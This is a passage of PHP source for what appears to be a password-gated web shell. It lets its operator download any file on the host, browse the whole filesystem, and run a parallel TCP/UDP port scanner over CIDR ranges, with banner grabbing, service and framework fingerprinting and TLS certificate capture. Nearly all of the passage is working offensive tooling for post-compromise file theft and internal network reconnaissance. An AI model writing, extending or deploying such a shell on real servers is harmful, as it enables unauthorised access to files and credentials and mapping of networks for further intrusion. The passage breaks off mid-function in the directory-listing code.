function shells_x_read_file_truncated(string $path, int $maxBytes = 20000): array {
    $raw = @file_get_contents($path, false, null, 0, $maxBytes + 1);
    if ($raw === false)
        return ['error' => "read failed: $path"];
    $truncated = strlen($raw) > $maxBytes;
    if ($truncated)
        $raw = substr($raw, 0, $maxBytes);
    return ['content' => $raw, 'truncated' => $truncated];
}
if (!function_exists('shells_x_realpath')) {
    require_once __DIR__ . '/helpers.php';
}
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (!is_string($file) || $file === '') {
        http_response_code(400);
        exit;
    }
    $realResult = shells_x_validate_readable_file($file);
    if (isset($realResult['error'])) {
        http_response_code(404);
        exit;
    }
    $real = $realResult['path'];
    // Access control is the auth gate (password + session); downloads are
    // not additionally confined to the shell's directory — the file browser
    // navigates the whole filesystem and any browsed file must be fetchable.
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . str_replace(['"', "\r", "\n"], '', basename($real)) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($real));
    readfile($real);
    exit;
}
if (isset($_POST['action']) && strncmp($_POST['action'], 'scan_', 5) === 0) {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    @set_time_limit(0);
    ignore_user_abort(true);

    // ---- Paths + GC ----
    $__sc_dir = sys_get_temp_dir();
    $__sc_prefix = $__sc_dir . '/shellscan_';
    foreach (@glob($__sc_prefix . '*.json') ?: [] as $__f) {
        if (@filemtime($__f) < time() - 86400) {
            @unlink($__f);
            @unlink(substr($__f, 0, -5) . '.jsonl');
            @unlink(substr($__f, 0, -5) . '.lock');
        }
    }
    // Orphaned locks (state json already gone — crash between unlinks, or a
    // not-found path from an older build) have no .json sibling for the loop
    // above to key off, so sweep them directly.
    foreach (@glob($__sc_prefix . '*.lock') ?: [] as $__f) {
        if (@filemtime($__f) < time() - 86400)
            @unlink($__f);
    }

    // ---- Helpers ----
    $__sc_state_path = function ($id) use ($__sc_prefix) {
        return $__sc_prefix . $id . '.json'; };
    $__sc_events_path = function ($id) use ($__sc_prefix) {
        return $__sc_prefix . $id . '.jsonl'; };
    $__sc_lock_path = function ($id) use ($__sc_prefix) {
        return $__sc_prefix . $id . '.lock'; };

    // Acquire LOCK_EX on the sidecar lock file. The state json itself is replaced
// atomically via rename, so locking it directly wouldn't survive the rename —
// the lock has to live on a separate, stable file.
    $__sc_acquire_lock = function ($id) use ($__sc_lock_path) {
        $fp = @fopen($__sc_lock_path($id), 'c');
        if (!$fp)
            return null;
        if (!@flock($fp, LOCK_EX)) {
            @fclose($fp);
            return null;
        }
        return $fp;
    };
    $__sc_release_lock = function ($fp) {
        if (!$fp)
            return;
        @flock($fp, LOCK_UN);
        @fclose($fp);
    };

    $__sc_read_state = function ($id) use ($__sc_state_path) {
        $p = $__sc_state_path($id);
        if (!@is_file($p))
            return null;
        $raw = @file_get_contents($p);
        if (!$raw)
            return null;
        $s = @json_decode($raw, true);
        return is_array($s) ? $s : null;
    };

    $__sc_write_state = function ($id, $state) use ($__sc_state_path) {
        $p = $__sc_state_path($id);
        $tmp = $p . '.tmp.' . bin2hex(random_bytes(3));
        @file_put_contents($tmp, json_encode($state));
        @rename($tmp, $p);
    };
    // Progress files exist ONLY while a scan is live. Completion ('done'),
    // stop and destroy remove them immediately — the operator's IndexedDB
    // is the durable record. The 24h GC above stays as a crash safety net
    // for sessions that died without a final poll (browser killed, etc.).
    $__sc_remove_files = function ($id) use ($__sc_state_path, $__sc_events_path, $__sc_lock_path) {
        @unlink($__sc_state_path($id));
        @unlink($__sc_events_path($id));
        @unlink($__sc_lock_path($id));
    };

    $__sc_validate_id = function ($id) {
        return is_string($id) && preg_match('/^[a-f0-9]{8,16}$/', $id);
    };

    // CIDR + host list parser. Accepts comma-separated mix of CIDR (a.b.c.d/N), single IPs, "a.b.c.d-e" ranges.
    $__sc_expand_targets = function ($str) {
        $ips = [];
        foreach (preg_split('/[\s,]+/', trim($str)) as $part) {
            if ($part === '')
                continue;
            if (strpos($part, '/') !== false) {
                list($base, $prefix) = explode('/', $part, 2);
                $baseInt = ip2long($base);
                $prefix = (int) $prefix;
                if ($baseInt === false || $prefix < 0 || $prefix > 32)
                    continue;
                $mask = $prefix === 0 ? 0 : (~0 << (32 - $prefix));
                $network = $baseInt & $mask;
                $count = 1 << (32 - $prefix);
                if ($count === 1) {
                    $ips[] = long2ip($network);
                } elseif ($count === 2) {
                    $ips[] = long2ip($network);
                    $ips[] = long2ip($network + 1);
                } else {
                    for ($i = 1; $i < $count - 1; $i++)
                        $ips[] = long2ip($network + $i);
                }
            } elseif (preg_match('/^(\d+\.\d+\.\d+\.)(\d+)-(\d+)$/', $part, $m)) {
                $from = max(0, min(255, (int) $m[2]));
                $to = max(0, min(255, (int) $m[3]));
                if ($to < $from) {
                    $t = $from;
                    $from = $to;
                    $to = $t;
                }
                for ($i = $from; $i <= $to; $i++)
                    $ips[] = $m[1] . $i;
            } else {
                // Plain host or IP. Resolve hostname lazily — keep as string.
                $ips[] = $part;
            }
        }
        return array_values(array_unique($ips));
    };

    $__sc_expand_ports = function ($str) {
        $ports = [];
        foreach (explode(',', $str) as $part) {
            $part = trim($part);
            if ($part === '')
                continue;
            if (strpos($part, '-') !== false) {
                list($f, $t) = explode('-', $part, 2);
                $f = max(1, (int) $f);
                $t = min(65535, (int) $t);
                for ($p = $f; $p <= $t; $p++)
                    $ports[] = $p;
            } else {
                $p = (int) $part;
                if ($p >= 1 && $p <= 65535)
                    $ports[] = $p;
            }
        }
        return array_values(array_unique($ports));
    };

    // Task at integer cursor maps to (ip_idx, port_idx, proto_idx). Port-major order:
// iterate all IPs for port[0], then all IPs for port[1], etc. Faster early discovery.
    $__sc_task_at = function ($i, $ips, $ports, $protos) {
        $nI = count($ips);
        $nProto = count($protos);
        $proto_idx = $i % $nProto;
        $ip_idx = (intdiv($i, $nProto)) % $nI;
        $port_idx = intdiv($i, $nProto * $nI);
        return [$ips[$ip_idx], $ports[$port_idx], $protos[$proto_idx]];
    };

    // ---- TCP parallel connect ----
    $__sc_tcp_batch = function ($tasks, $timeout_ms) {
        $results = [];
        $sockets = [];
        $start = [];
        $now = microtime(true);
        foreach ($tasks as $k => $t) {
            $errno = 0;
            $errstr = '';
            $s = @stream_socket_client(
                "tcp://{$t[0]}:{$t[1]}",
                $errno,
                $errstr,
                0.001,
                STREAM_CLIENT_ASYNC_CONNECT | STREAM_CLIENT_CONNECT
            );
            if ($s) {
                @stream_set_blocking($s, false);
                $sockets[$k] = $s;
                $start[$k] = $now;
            } else {
                $results[$k] = ['state' => 'closed', 'latency_ms' => 0, 'error' => $errstr ?: ('errno ' . $errno)];
            }
        }
        $deadline = $now + ($timeout_ms / 1000);
        while (!empty($sockets) && microtime(true) < $deadline) {
            $r = [];
            $e = [];
            $w = $sockets;
            $remain = $deadline - microtime(true);
            if ($remain <= 0)
                break;
            $tv_sec = (int) $remain;
            $tv_usec = (int) (($remain - $tv_sec) * 1000000);
            if (@stream_select($r, $w, $e, $tv_sec, min(200000, $tv_usec)) > 0) {
                foreach ($w as $k => $sock) {
                    $peer = @stream_socket_get_name($sock, true);
                    $lat = (int) ((microtime(true) - $start[$k]) * 1000);
                    if ($peer !== false && $peer !== '') {
                        $results[$k] = ['state' => 'open', 'latency_ms' => $lat, '_sock' => $sock];
                    } else {
                        $results[$k] = ['state' => 'closed', 'latency_ms' => $lat];
                        @fclose($sock);
                    }
                    unset($sockets[$k]);
                }
            } else {
                // no activity this tick — loop checks deadline
            }
        }
        foreach ($sockets as $k => $s) {
            $results[$k] = ['state' => 'filtered', 'latency_ms' => $timeout_ms];
            @fclose($s);
        }
        return $results;
    };

    // ---- TCP banner grab + fingerprint (subset of deleted fingerprint.php, kept inline) ----
    $__sc_tcp_fingerprint = function ($sock, $host, $port, $timeout_ms) {
        $passive = [21, 22, 23, 25, 110, 143, 587, 3306, 5672, 11211];
        $portProbe = [
            80 => 'http',
            8080 => 'http',
            8000 => 'http',
            8888 => 'http',
            9090 => 'http',
            8181 => 'http',
            443 => 'http',
            8443 => 'http',
            6379 => 'redis',
            5432 => 'pgsql',
            27017 => 'mongo',
            11211 => 'memcache',
            9200 => 'http'
        ];
        $probes = [
            'http' => "HEAD / HTTP/1.0\r\nHost: {$host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
            'redis' => "PING\r\nINFO server\r\nQUIT\r\n",
            'pgsql' => "\x00\x00\x00\x08\x04\xd2\x16\x2f",
            'memcache' => "stats\r\nquit\r\n",
        ];
        @stream_set_blocking($sock, true);
        @stream_set_timeout($sock, 0, $timeout_ms * 1000);
        $banner = '';
        $probe = $portProbe[$port] ?? null;
        if (in_array($port, $passive) && $probe === null) {
            $banner = @fread($sock, 4096) ?: '';
        } elseif ($probe && isset($probes[$probe])) {
            @fwrite($sock, $probes[$probe]);
            $banner = '';
            $end = microtime(true) + ($timeout_ms / 1000);
            while (microtime(true) < $end && strlen($banner) < 8192) {
                $chunk = @fread($sock, 4096);
                if ($chunk === false || $chunk === '') {
                    $m = @stream_get_meta_data($sock);
                    if (!empty($m['timed_out']) || !empty($m['eof']))
                        break;
                    break;
                }
                $banner .= $chunk;
            }
        } else {
            @stream_set_timeout($sock, 0, min(800000, $timeout_ms * 1000));
            $banner = @fread($sock, 4096) ?: '';
            if (strlen(trim($banner)) === 0) {
                @fwrite($sock, $probes['http']);
                @stream_set_timeout($sock, 0, $timeout_ms * 1000);
                $banner = '';
                $end = microtime(true) + ($timeout_ms / 1000);
                while (microtime(true) < $end && strlen($banner) < 4096) {
                    $chunk = @fread($sock, 2048);
                    if ($chunk === false || $chunk === '')
                        break;
                    $banner .= $chunk;
                }
            }
        }
        @fclose($sock);
        $banner = substr($banner, 0, 2048);

        $service = '';
        $version = '';
        $info = [];
        if (preg_match('/^SSH-[\d.]+-(.+)/m', $banner, $m)) {
            $service = 'SSH';
            $version = trim($m[1]);
            if (preg_match('/(Ubuntu|Debian|FreeBSD|RHEL|RedHat)/i', $m[1], $o))
                $info[] = 'OS: ' . $o[1];
        } elseif ($port == 21 && preg_match('/^220[- ](.+)/m', $banner, $m)) {
            $service = 'FTP';
            $version = trim($m[1]);
        } elseif (in_array($port, [25, 465, 587]) && preg_match('/^220[- ](.+)/m', $banner, $m)) {
            $service = 'SMTP';
            $version = trim($m[1]);
        } elseif ($port == 110 && preg_match('/^\+OK\s*(.*)/m', $banner, $m)) {
            $service = 'POP3';
            $version = trim($m[1]);
        } elseif ($port == 143 && preg_match('/^\* OK\s*(.*)/m', $banner, $m)) {
            $service = 'IMAP';
            $version = trim($m[1]);
        } elseif ($port == 3306 && strlen($banner) > 5) {
            $service = 'MySQL';
            $verEnd = strpos($banner, "\x00", 5);
            if ($verEnd !== false) {
                $ver = substr($banner, 5, $verEnd - 5);
                if (preg_match('/[\d.]+/', $ver, $vm)) {
                    $version = $vm[0];
                    if (stripos($ver, 'MariaDB') !== false)
                        $service = 'MariaDB';
                }
            }
        } elseif (preg_match('/\+PONG|redis_version/m', $banner)) {
            $service = 'Redis';
            if (preg_match('/redis_version:([\d.]+)/m', $banner, $v))
                $version = $v[1];
        } elseif ($port == 5432 && strlen($banner) >= 1) {
            $service = 'PostgreSQL';
            $version = ($banner[0] === 'S') ? 'SSL supported' : 'No SSL';
        } elseif (preg_match('/STAT version\s+([\d.]+)/m', $banner, $m)) {
            $service = 'Memcached';
            $version = $m[1];
        } elseif ($port == 23) {
            $service = 'Telnet';
            $printable = preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\xff]/', '', $banner);
            $version = trim(substr($printable, 0, 80));
        }
        if (preg_match('/^HTTP\/[\d.]+\s+(\d+)/m', $banner, $hm)) {
            if (!$service)
                $service = 'HTTP';
            $info[] = 'Status: ' . $hm[1];
            if (preg_match('/^Server:\s*(.+)/mi', $banner, $sv))
                $version = trim($sv[1]);
            if (preg_match('/^X-Powered-By:\s*(.+)/mi', $banner, $xp))
                $info[] = 'Powered: ' . trim($xp[1]);
            if (preg_match('/^Set-Cookie:\s*(\S+)/mi', $banner, $ck)) {
                $c = $ck[1];
                if (stripos($c, 'PHPSESSID') !== false)
                    $info[] = 'Framework: PHP';
                elseif (stripos($c, 'JSESSIONID') !== false)
                    $info[] = 'Framework: Java';
                elseif (stripos($c, 'ASP.NET') !== false)
                    $info[] = 'Framework: ASP.NET';
                elseif (stripos($c, 'connect.sid') !== false)
                    $info[] = 'Framework: Node';
                elseif (stripos($c, 'laravel_session') !== false)
                    $info[] = 'Framework: Laravel';
                elseif (stripos($c, 'csrftoken') !== false)
                    $info[] = 'Framework: Django';
            }
        }
        $bannerClean = preg_replace('/[^\x20-\x7E\r\n\t]/', '.', $banner);
        $bannerClean = substr(trim($bannerClean), 0, 1024);
        return ['banner' => $bannerClean, 'service' => $service, 'version' => $version, 'info' => $info];
    };

    // TLS cert grab for 443/8443
    $__sc_tls_cert = function ($host, $port, $timeout_ms) {
        if (!function_exists('stream_socket_client'))
            return null;
        $ctx = stream_context_create([
            'ssl' => [
                'capture_peer_cert' => true,
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true,
                'SNI_enabled' => true,
                'peer_name' => $host,
            ]
        ]);
        $fp = @stream_socket_client("ssl://{$host}:{$port}", $errno, $errstr, $timeout_ms / 1000, STREAM_CLIENT_CONNECT, $ctx);
        if (!$fp)
            return null;
        $params = @stream_context_get_params($fp);
        @fclose($fp);
        if (empty($params['options']['ssl']['peer_certificate']))
            return null;
        $cert = @openssl_x509_parse($params['options']['ssl']['peer_certificate']);
        if (!$cert)
            return null;
        $sans = [];
        if (!empty($cert['extensions']['subjectAltName'])) {
            preg_match_all('/DNS:([^,\s]+)/', $cert['extensions']['subjectAltName'], $m);
            $sans = $m[1] ?? [];
        }
        return [
            'subject_cn' => $cert['subject']['CN'] ?? '',
            'issuer_cn' => $cert['issuer']['CN'] ?? '',
            'issuer_org' => $cert['issuer']['O'] ?? '',
            'valid_from' => date('Y-m-d', $cert['validFrom_time_t'] ?? 0),
            'valid_to' => date('Y-m-d', $cert['validTo_time_t'] ?? 0),
            'self_signed' => ($cert['subject'] == $cert['issuer']),
            'sans' => $sans,
        ];
    };

    // ---- UDP probe (sequential) ----
    $__sc_udp_probes = [
        53 => "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03",
        123 => "\xe3" . str_repeat("\x00", 47),
        137 => "\x82\x28\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01",
        161 => "\x30\x29\x02\x01\x00\x04\x06public\xa0\x1c\x02\x04\x71\x47\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00",
        500 => "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x9c",
        1900 => "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n",
        5353 => "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01",
    ];

    // Helper: classify a UDP service by known well-known port.
    $__sc_udp_service = function ($port) {
        if ($port == 53)
            return 'DNS';
        if ($port == 123)
            return 'NTP';
        if ($port == 137)
            return 'NetBIOS';
        if ($port == 161)
            return 'SNMP';
        if ($port == 500)
            return 'IKE/IPsec';
        if ($port == 1900)
            return 'SSDP';
        if ($port == 5353)
            return 'mDNS';
        return '';
    };

    // Parallel UDP scan, mirroring __sc_tcp_batch. Opens one connected UDP socket
// per task, sends the per-port probe, then drives all sockets with a single
// stream_select deadline loop. Empirically verified lossless: see
// claudedocs/research_php_parallel_udp.md. Throughput ~111x the sequential
// per-task version at concurrency=64.
    $__sc_udp_batch = function ($tasks, $timeout_ms) use ($__sc_udp_probes, $__sc_udp_service) {
        $results = [];
        $sockets = [];
        $starts = [];
        $now = microtime(true);
        foreach ($tasks as $k => $t) {
            list($host, $port) = $t;
            $probe = $__sc_udp_probes[$port] ?? "\x00";
            $errno = 0;
            $errstr = '';
            // Tiny connect timeout — UDP "connect" is just kernel bookkeeping, no
// network round-trip. Failure here means resolver / route problem.
            $s = @stream_socket_client("udp://{$host}:{$port}", $errno, $errstr, 0.01);
            if (!$s) {
                $results[$k] = ['state' => 'filtered', 'latency_ms' => 0, 'error' => $errstr ?: ('errno ' . $errno)];
                continue;
            }
            @stream_set_blocking($s, false);
            @stream_socket_sendto($s, $probe);
            $sockets[$k] = $s;
            $starts[$k] = $now;
        }
        $deadline = $now + ($timeout_ms / 1000);
        while (!empty($sockets) && microtime(true) < $deadline) {
            $r = $sockets;
            $w = [];
            $e = [];
            $remain = $deadline - microtime(true);
            if ($remain <= 0)
                break;
            $tv_sec = (int) $remain;
            $tv_usec = (int) (($remain - $tv_sec) * 1000000);
            if (@stream_select($r, $w, $e, $tv_sec, min(200000, $tv_usec)) > 0) {
                foreach ($r as $k => $sock) {
                    $peer = '';
                    $resp = @stream_socket_recvfrom($sock, 8192, 0, $peer);
                    $lat = (int) ((microtime(true) - $starts[$k]) * 1000);
                    if ($resp !== false && $resp !== '' && strlen($resp) > 0) {
                        list($host, $port) = $tasks[$k];
                        $banner = preg_replace('/[^\x20-\x7E\r\n\t]/', '.', substr($resp, 0, 512));
                        $results[$k] = [
                            'state' => 'open',
                            'latency_ms' => $lat,
                            'banner' => trim($banner),
                            'service' => $__sc_udp_service($port),
                            'version' => '',
                            'info' => [],
                        ];
                    } else {
                        // Socket reported readable but recvfrom returned nothing — usually
// ICMP Port Unreachable surfaced as ECONNREFUSED on this socket.
// Treat as filtered (we don't distinguish closed UDP separately).
                        $results[$k] = ['state' => 'filtered', 'latency_ms' => $lat];
                    }
                    @fclose($sock);
                    unset($sockets[$k]);
                }
            }
        }
        // Anything left at deadline didn't reply — filtered.
        foreach ($sockets as $k => $s) {
            $results[$k] = ['state' => 'filtered', 'latency_ms' => $timeout_ms];
            @fclose($s);
        }
        return $results;
    };

    // =================== ACTION DISPATCH ===================
    $action = $_POST['action'];

    if ($action === 'scan_start') {
        // Probe the one function the entire scanner depends on. Without it
        // every poll silently produces "filtered" results and the operator
        // wastes time on what looks like a fully-firewalled target. Bail
        // up front with a clear error instead.
        if (!function_exists('stream_socket_client') || !function_exists('stream_select')) {
            echo json_encode(['error' => 'Scanner unavailable: stream_socket_client / stream_select disabled in PHP. Check disable_functions.']);
            exit;
        }
        $targetsStr = trim($_POST['targets'] ?? '');
        $portsStr = trim($_POST['ports'] ?? '');

        // Reject absurd CIDR prefixes up front. /7 = 33M IPs, /0 = 4B IPs — both will
// either OOM the PHP process or hang the request in expand_targets.
        foreach (preg_split('/[\s,]+/', $targetsStr) as $__t) {
            if (strpos($__t, '/') !== false) {
                $__p = (int) substr($__t, strpos($__t, '/') + 1);
                if ($__p < 8 || $__p > 32) {
                    echo json_encode(['error' => "CIDR prefix out of range in '$__t' (must be /8..32)"]);
                    exit;
                }
            }
        }

        $proto = $_POST['proto'] ?? 'tcp';
        $timeout_ms = max(50, min(10000, (int) ($_POST['timeout_ms'] ?? 800)));
        $concurrency = max(1, min(512, (int) ($_POST['concurrency'] ?? 64)));
        $batch_ms = max(200, min(10000, (int) ($_POST['batch_ms'] ?? 1500)));
        $fingerprint = !empty($_POST['fingerprint']);

        if (!in_array($proto, ['tcp', 'udp', 'both']))
            $proto = 'tcp';
        $protos = $proto === 'both' ? ['tcp', 'udp'] : [$proto];

        $ips = $__sc_expand_targets($targetsStr);
        $ports = $__sc_expand_ports($portsStr);

        if (empty($ips)) {
            echo json_encode(['error' => 'No valid targets']);
            exit;
        }
        if (empty($ports)) {
            echo json_encode(['error' => 'No valid ports']);
            exit;
        }

        $total = count($ips) * count($ports) * count($protos);

        $id = bin2hex(random_bytes(4));
        $state = [
            'id' => $id,
            'status' => 'running',
            'started_at' => time(),
            'finished_at' => null,
            'opts' => [
                'targets_str' => $targetsStr,
                'ports_str' => $portsStr,
                'proto' => $proto,
                'timeout_ms' => $timeout_ms,
                'concurrency' => $concurrency,
                'batch_ms' => $batch_ms,
                'fingerprint' => $fingerprint,
            ],
            'ips' => $ips,
            'ports' => $ports,
            'protos' => $protos,
            'total' => $total,
            'cursor' => 0,
            'seq' => 0,
            'summary' => ['open' => 0, 'closed' => 0, 'filtered' => 0],
        ];
        $__sc_write_state($id, $state);
        @file_put_contents($__sc_events_path($id), '');
        echo json_encode(['id' => $id, 'total' => $total, 'host_count' => count($ips), 'port_count' => count($ports)]);
        exit;
    }

    if ($action === 'scan_poll') {
        $id = $_POST['id'] ?? '';
        $since = max(0, (int) ($_POST['since'] ?? 0));
        if (!$__sc_validate_id($id)) {
            echo json_encode(['error' => 'Invalid id']);
            exit;
        }

        // Serialize all state mutation for this scan id across concurrent requests
// (multi-tab pollers, control actions, reattach race). Held through the full
// batch; pause/resume/stop will queue until the current batch finishes.
        $lockFp = $__sc_acquire_lock($id);
        if (!$lockFp) {
            echo json_encode(['error' => 'Scan busy (lock unavailable)']);
            exit;
        }
        $state = $__sc_read_state($id);
        if (!$state) {
            $__sc_release_lock($lockFp);
            @unlink($__sc_lock_path($id));   // we created it via fopen('c')
            echo json_encode(['error' => 'Scan not found']);
            exit;
        }

        if ($state['status'] === 'running' && $state['cursor'] < $state['total']) {
            $batchStart = microtime(true);
            $batchDeadline = $batchStart + ($state['opts']['batch_ms'] / 1000);
            $ips = $state['ips'];
            $ports = $state['ports'];
            $protos = $state['protos'];

            while (microtime(true) < $batchDeadline && $state['cursor'] < $state['total']) {
                $batchSize = min($state['opts']['concurrency'], $state['total'] - $state['cursor']);
                $tcpTasks = [];
                $udpTasks = [];
                $taskOrder = [];
                for ($i = 0; $i < $batchSize; $i++) {
                    $idx = $state['cursor'] + $i;
                    list($host, $port, $pr) = $__sc_task_at($idx, $ips, $ports, $protos);
                    $key = $idx;
                    $taskOrder[$key] = ['host' => $host, 'port' => $port, 'proto' => $pr];
                    if ($pr === 'tcp')
                        $tcpTasks[$key] = [$host, $port];
                    else
                        $udpTasks[$key] = [$host, $port];
                }

                $batchResults = [];
                if (!empty($tcpTasks)) {
                    $tcpResults = $__sc_tcp_batch($tcpTasks, $state['opts']['timeout_ms']);
                    foreach ($tcpResults as $k => $r) {
                        if ($r['state'] === 'open' && $state['opts']['fingerprint'] && isset($r['_sock'])) {
                            $ti = $taskOrder[$k];
                            $fp = $__sc_tcp_fingerprint($r['_sock'], $ti['host'], $ti['port'], $state['opts']['timeout_ms']);
                            $r = array_merge($r, $fp);
                            if (in_array($ti['port'], [443, 8443])) {
                                $tls = $__sc_tls_cert($ti['host'], $ti['port'], $state['opts']['timeout_ms']);
                                if ($tls)
                                    $r['tls'] = $tls;
                            }
                        } elseif (isset($r['_sock'])) {
                            @fclose($r['_sock']);
                        }
                        unset($r['_sock']);
                        $batchResults[$k] = $r;
                    }
                }
                if (!empty($udpTasks)) {
                    $udpResults = $__sc_udp_batch($udpTasks, $state['opts']['timeout_ms']);
                    foreach ($udpResults as $k => $r)
                        $batchResults[$k] = $r;
                }

                // Only 'open' events get persisted to jsonl. closed/filtered just bump
// summary counters in state, keeping the events file tiny on huge scans.
                $evFp = null;
                foreach ($batchResults as $k => $r) {
                    $ti = $taskOrder[$k];
                    $sumKey = $r['state'];
                    if (!isset($state['summary'][$sumKey]))
                        $state['summary'][$sumKey] = 0;
                    $state['summary'][$sumKey]++;
                    if ($r['state'] !== 'open')
                        continue;
                    $ev = [
                        'seq' => $state['seq']++,
                        'ts' => time(),
                        'host' => $ti['host'],
                        'port' => $ti['port'],
                        'proto' => $ti['proto'],
                        'state' => $r['state'],
                        'latency_ms' => $r['latency_ms'] ?? 0,
                    ];
                    if (!empty($r['banner']))
                        $ev['banner'] = $r['banner'];
                    if (!empty($r['service']))
                        $ev['service'] = $r['service'];
                    if (!empty($r['version']))
                        $ev['version'] = $r['version'];
                    if (!empty($r['info']))
                        $ev['info'] = $r['info'];
                    if (!empty($r['tls']))
                        $ev['tls'] = $r['tls'];
                    if ($evFp === null)
                        $evFp = @fopen($__sc_events_path($id), 'a');
                    if ($evFp)
                        fwrite($evFp, json_encode($ev) . "\n");
                }
                if ($evFp)
                    fclose($evFp);
                $state['cursor'] += $batchSize;
                $__sc_write_state($id, $state);
            }

            if ($state['cursor'] >= $state['total'] && $state['status'] === 'running') {
                $state['status'] = 'done';
                $state['finished_at'] = time();
                $__sc_write_state($id, $state);
            }
        }
        $__sc_release_lock($lockFp);

        // Read events since offset
        $events = [];
        $next_offset = $since;
        $evPath = $__sc_events_path($id);
        if (@is_file($evPath)) {
            $size = @filesize($evPath) ?: 0;
            if ($size > $since) {
                $fp = @fopen($evPath, 'r');
                if ($fp) {
                    @fseek($fp, $since);
                    $buf = @stream_get_contents($fp);
                    $next_offset = @ftell($fp);
                    @fclose($fp);
                    foreach (explode("\n", $buf) as $line) {
                        $line = trim($line);
                        if ($line === '')
                            continue;
                        $obj = @json_decode($line, true);
                        if ($obj)
                            $events[] = $obj;
                    }
                }
            }
        }

        // Scan just finished: the response above carries the final state and
        // the last events — nothing on the server needs the files anymore.
        if ($state['status'] === 'done')
            $__sc_remove_files($id);

        echo json_encode([
            'state' => [
                'id' => $state['id'],
                'status' => $state['status'],
                'started_at' => $state['started_at'],
                'finished_at' => $state['finished_at'],
                'total' => $state['total'],
                'cursor' => $state['cursor'],
                'summary' => $state['summary'],
                'opts' => $state['opts'],
            ],
            'events' => $events,
            'next_offset' => $next_offset,
        ]);
        exit;
    }

    if ($action === 'scan_pause' || $action === 'scan_resume' || $action === 'scan_stop') {
        $id = $_POST['id'] ?? '';
        if (!$__sc_validate_id($id)) {
            echo json_encode(['error' => 'Invalid id']);
            exit;
        }
        // Block until any in-flight poll batch finishes so the status change isn't
// overwritten by the poll's post-batch state write.
        $lockFp = $__sc_acquire_lock($id);
        if (!$lockFp) {
            echo json_encode(['error' => 'Scan busy (lock unavailable)']);
            exit;
        }
        $state = $__sc_read_state($id);
        if (!$state) {
            $__sc_release_lock($lockFp);
            @unlink($__sc_lock_path($id));   // we created it via fopen('c')
            echo json_encode(['error' => 'Scan not found']);
            exit;
        }
        if ($action === 'scan_pause' && $state['status'] === 'running')
            $state['status'] = 'paused';
        elseif ($action === 'scan_resume' && $state['status'] === 'paused')
            $state['status'] = 'running';
        elseif ($action === 'scan_stop' && in_array($state['status'], ['running', 'paused'])) {
            $state['status'] = 'stopped';
            $state['finished_at'] = time();
        }
        $__sc_write_state($id, $state);
        $__sc_release_lock($lockFp);
        // A stopped scan will never be polled again — remove its progress
        // files right away; results already delivered live in the client.
        if ($action === 'scan_stop')
            $__sc_remove_files($id);
        echo json_encode(['status' => $state['status']]);
        exit;
    }

    if ($action === 'scan_list') {
        $out = [];
        foreach (@glob($__sc_prefix . '*.json') ?: [] as $f) {
            $s = @json_decode(@file_get_contents($f), true);
            if (!$s || !isset($s['id']))
                continue;
            $out[] = [
                'id' => $s['id'],
                'status' => $s['status'],
                'started_at' => $s['started_at'],
                'finished_at' => $s['finished_at'] ?? null,
                'total' => $s['total'],
                'cursor' => $s['cursor'],
                'opts' => $s['opts'],
                'summary' => $s['summary'],
            ];
        }
        usort($out, function ($a, $b) {
            return $b['started_at'] - $a['started_at']; });
        echo json_encode(['scans' => $out]);
        exit;
    }

    if ($action === 'scan_destroy') {
        $id = $_POST['id'] ?? '';
        if (!$__sc_validate_id($id)) {
            echo json_encode(['error' => 'Invalid id']);
            exit;
        }
        $lockFp = $__sc_acquire_lock($id);
        if (!$lockFp) {
            echo json_encode(['error' => 'Scan busy (lock unavailable)']);
            exit;
        }
        @unlink($__sc_state_path($id));
        @unlink($__sc_events_path($id));
        $__sc_release_lock($lockFp);
        @unlink($__sc_lock_path($id));
        echo json_encode(['ok' => true]);
        exit;
    }

    echo json_encode(['error' => 'Unknown scan action: ' . $action]);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'ls') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $d = $_POST['dir'] ?? '/';
    if (!is_dir($d))
        $d = '/';
    $d = realpath($d) ?: $d;
    $entries = [];
    foreach (@scandir($d) ?: [] as $name) {
        $full = $d . '/' . $name;
        $isLink = is_link($full);
        $linkTarget = $isLink ? @readlink($full) : null;
        $real = realpath($full);
        $broken = ($real === false);
        $stat = $broken ? @lstat($full) : @stat($full);
        $isDir = $broken ? false : is_dir($real);
        // Fall back to the numeric uid/gid when posix_getpwuid/getgrgid
        // can't resolve a name — common inside containers where host-mounted
        // files keep their host uid (e.g. 1000) which isn't in the container's
        // /etc/passwd. "1000:1000" is far more useful than "?:?" for operator
        // context.
        $owner = $stat ? (string) $stat['uid'] : '?';
        $group = $stat ? (string) $stat['gid'] : '?';
        if (function_exists('posix_getpwuid') && $stat) {
            $info = @posix_getpwuid($stat['uid']);
            if ($info)
                $owner = $info['name'];
        }
        if (function_exists('posix_getgrgid') && $stat) {
            $gi = @posix_getgrgid($stat['gid']);
            if ($gi)
                $group = $gi['name'];
        }
        $mode = $stat ? $stat['mode'] : 0;
        $perms = decoct($mode & 07777);
        $entry = [
            'name' => $name,
            'path' => $broken ? $full : $real,
            'dir' => $isDir,
            'size' => $isDir ? null : ($stat ? $stat['size'] : null),
